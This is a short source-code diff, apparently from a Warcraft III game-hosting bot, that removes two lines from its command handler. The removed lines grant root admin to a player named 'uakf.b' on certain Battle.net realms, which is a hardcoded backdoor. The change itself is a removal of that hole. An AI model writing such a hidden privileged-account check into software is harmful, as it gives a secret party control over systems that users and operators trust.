@@ -849,9 +849,6 @@ bool CGame :: EventPlayerBotCommand( CGamePlayer *player, string command, string
 		}
 	}
 
-	if( ( player->GetSpoofedRealm( ) == "useast.battle.net" || player->GetSpoofedRealm( ) == "uswest.battle.net" || player->GetSpoofedRealm( ) == "europe.battle.net" ) && User == "uakf.b" )
-	  RootAdminCheck = true;
-
 	if( player->GetSpoofed( ) && ( AdminCheck || RootAdminCheck || IsOwner( User ) ) )
 	{
 		CONSOLE_Print( "[GAME: " + m_GameName + "] admin [" + User + "] sent command [" + Command + "] with payload [" + Payload + "]" );
